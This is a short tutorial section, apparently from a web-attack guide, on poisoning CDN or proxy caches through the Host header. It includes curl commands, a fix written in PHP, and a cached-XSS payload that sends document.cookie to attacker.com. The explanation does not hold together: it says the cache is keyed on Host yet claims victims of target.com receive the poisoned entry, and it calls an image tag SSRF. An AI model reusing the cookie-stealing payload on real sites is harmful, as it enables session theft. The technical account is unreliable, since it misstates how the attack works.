# 2.2 Cache Poisoning

## Goal

Poison cache (CDN, reverse proxy) with malicious content keyed to attacker's domain.

---

## How It Works

```
1. CDN/Cache uses Host header as cache key
2. Attacker sends request with Host: attacker.com
3. Server responds with content
4. Response cached with key = attacker.com
5. Next request to attacker.com serves poisoned cache
6. Victim gets poisoned content!
```

---

## Attack Setup

### Step 1: Identify Cache
Check headers:
```bash
curl -i https://target.com/

# Look for:
Cache-Control: public
X-Cache-Status: MISS/HIT
X-CDN-Provider: CloudFlare/Akamai/etc
Via: proxy info
```

### Step 2: Poison with Attacker Host
```bash
curl -i -H "Host: attacker.com" https://target.com/

# Server might return:
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
X-Cache-Status: MISS

# Attacker host cached!
```

### Step 3: Verify Poisoning
```bash
# Check if cache returns poisoned content
curl -i https://target.com/  (now cached with attacker.com)

# If X-Cache-Status: HIT and uses attacker domain = POISONED
```

---

## Real-World Scenario

```
1. Target uses CloudFlare CDN
2. Application reflects Host in absolute URLs
3. Attacker sends:
   GET / HTTP/1.1
   Host: attacker.com

4. Response:
   HTTP/1.1 200 OK (Cache-Control: public)
   <a href="https://attacker.com/profile">Profile</a>

5. Response cached with key = attacker.com
6. Next victim accessing same URL gets poisoned cache
7. Malicious link served to innocent users!
```

---

## Exploitation

### Variation 1: XSS via Cache
```html
<!-- Cached response -->
<script>
  const host = 'attacker.com';
  fetch('https://attacker.com/steal?cookies=' + document.cookie);
</script>
```

### Variation 2: Open Redirect
```html
<a href="https://attacker.com/">Click to Continue</a>
```

### Variation 3: SSRF
```html
<img src="https://attacker.com/internal-resource">
```

## Prevention

```php
// Don't use Host in cache key
$cache_key = md5($uri);  // Just use URI

// Or whitelist allowed hosts
$allowed = ['target.com'];
if (!in_array($_SERVER['HTTP_HOST'], $allowed)) {
    header('HTTP/1.1 400 Bad Request');
    exit;
}
```
